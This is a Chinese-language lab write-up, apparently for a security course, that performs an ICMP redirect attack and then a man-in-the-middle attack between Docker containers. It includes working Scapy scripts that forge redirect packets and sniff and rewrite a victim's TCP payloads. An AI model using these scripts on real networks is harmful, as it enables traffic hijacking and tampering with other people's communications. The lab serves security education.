---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# ICMP Redirect

!!! warning "在 Ubuntu 24.04 中的改动"

	如果直接在 24.04 中启动实验容器，会遇到：
	
	![](../../../../../assets/Pasted%20image%2020250513172909.png)
	
	> 这是因为 `sysctls` 块通常用于设置容器全局的内核参数，而像 `eth0` 这样的接口是在容器启动并连接到网络之后才确定的。Docker 为了更精确地控制网络接口相关的参数，要求这类配置通过特定的驱动选项来传递
	> 
	> —— Gemini 2.5 Pro
	
	因此我们要对 docker-compose.yml 进行如下修改：
	
	```yaml
	sysctls: 
		- net.ipv4.ip_forward=1 
		- net.ipv4.conf.all.send_redirects=0 
		- net.ipv4.conf.default.send_redirects=0 
		# 移除: - net.ipv4.conf.eth0.send_redirects=0 
	privileged: true
	volumes: 
		- ./volumes:/volumes 
	networks: 
		net-10.9.0.0: 
			ipv4_address: 10.9.0.111 
	command: bash -c "
		 # 在容器启动后尝试设置 eth0 的参数 
		 sysctl -w net.ipv4.conf.eth0.send_redirects=0
		 && ip route add 192.168.60.0/24 via 10.9.0.11 
		 && tail -f /dev/null 
		 "
	```
	
	重新启动容器即可进行接下来的实验

## 任务 1：发起 ICMP 重定向攻击

在受害者容器 `victim-10.9.0.5` 中运行 `ip route`，输出如下：

![](../../../../../assets/Pasted%20image%2020250513174214.png)

在攻击者容器中编写代码如下：

```python title="icmp_redirect.py"
from scapy.all import *

ip = IP(src = "10.9.0.11", dst = "10.9.0.5")
# Type 5 表示重定向, Code 1 表示主机重定向
icmp = ICMP(type = 5, code = 1)
# 在 ICMP 负载中设置网关地址 (恶意路由器)
icmp.gw = "10.9.0.111"

# ICMP 重定向包必须携带触发它的原始 IP 数据包
ip2 = IP(src="10.9.0.5", dst="192.168.60.5")
send(ip / icmp / ip2 / ICMP())
```

首先在受害者容器中显示路由缓存并清空：

![](../../../../../assets/Pasted%20image%2020250513174805.png)

保持在受害者容器中 `ping 192.168.60.5`，然后在攻击者容器中运行代码，并在受害者容器中进行 traceroute 操作：

![](../../../../../assets/Pasted%20image%2020250513192753.png)

会发现受害者容器的路由已经改变

- 问题 1：修改代码如下：

```python
from scapy.all import *

ip = IP(src = "10.9.0.11", dst = "10.9.0.5")
icmp = ICMP(type = 5, code = 1)
icmp.gw = "192.168.60.6"

ip2 = IP(src="10.9.0.5", dst="192.168.60.5")
send(ip / icmp / ip2 / ICMP())
```

同上理运行代码，能得到：

![](../../../../../assets/Pasted%20image%2020250513193209.png)

可以看到没能实现攻击

- 问题二：修改代码如下：

```python
from scapy.all import *

ip = IP(src = "10.9.0.11", dst = "10.9.0.5")
icmp = ICMP(type = 5, code = 1)
icmp.gw = "10.9.0.99"

ip2 = IP(src="10.9.0.5", dst="192.168.60.5")
send(ip / icmp / ip2 / ICMP())
```

同上理运行代码，能得到：

![](../../../../../assets/Pasted%20image%2020250513193544.png)

还是没能实现攻击

- 问题三：在恶意路由器容器中设置：

```bash
sysctl -w net.ipv4.conf.all.send_redirects=1
sysctl -w net.ipv4.conf.default.send_redirects=1
sysctl -w net.ipv4.conf.eth0.send_redirects=1
```

然后重新发起正确的 ICMP 重定向攻击，得到：

![](../../../../../assets/Pasted%20image%2020250513195945.png)

仍然是不能实现攻击的
***
## 任务 2：发起 MITM 攻击

首先在恶意路由器上禁用 IP 转发：

![](../../../../../assets/Pasted%20image%2020250513201025.png)

查看受害者容器的 MAC 地址：

![](../../../../../assets/Pasted%20image%2020250513201728.png)

保持受害者容器 `ping 192.168.60.5`，然后在攻击者容器中运行 `icmp_redirect.py`，在恶意路由器上编写如下代码并运行：

```python title="mitm.py"
from scapy.all import *

def spoof_pkt(pkt):
	newpkt = IP(bytes(pkt[IP]))
	del(newpkt.chksum)
	del(newpkt[TCP].payload)
	del(newpkt[TCP].chksum)
	
	if pkt[TCP].payload:
		data = pkt[TCP].payload.load
		print("*** %s, length: %d" % (data, len(data)))
		
		newdata = data.replace(b'BruceJin', b'AAAAAAAA')
		
		send(newpkt / newdata)
	else:
		send(newpkt)
	
f = 'tcp and ether src 42:16:51:ac:9e:0c'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

在目标容器 192.168.60.5 上启动 netcat 服务，并在受害者容器中连接到服务器，输入名字，会发现变成了 AAAAAAAA：

![](../../../../../assets/Pasted%20image%2020250513202209.png)

![](../../../../../assets/Pasted%20image%2020250513202218.png)

说明攻击成功

- 问题 4：我们只需要过滤出从 victim 到 host 的数据流量，因为我们就是要在这里将数据篡改使得 host 收到的是错误信息即可
- 问题 5：我们把过滤条件换成 A 的 IP 地址：

```python
from scapy.all import *

def spoof_pkt(pkt):
	newpkt = IP(bytes(pkt[IP]))
	del(newpkt.chksum)
	del(newpkt[TCP].payload)
	del(newpkt[TCP].chksum)
	
	if pkt[TCP].payload:
		data = pkt[TCP].payload.load
		print("*** %s, length: %d" % (data, len(data)))
		
		newdata = data.replace(b'BruceJin', b'AAAAAAAA')
		
		send(newpkt / newdata)
	else:
		send(newpkt)
	
f = 'tcp and src host 10.9.0.5'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

同样也可以达到效果：

![](../../../../../assets/Pasted%20image%2020250513203353.png)

![](../../../../../assets/Pasted%20image%2020250513203405.png)

但是会发现 mitm.py 这里一直在发包：

![](../../../../../assets/Pasted%20image%2020250513203442.png)

这是因为它捕获到了自己发送的报文，发送完又捕获到了，陷入了死循环
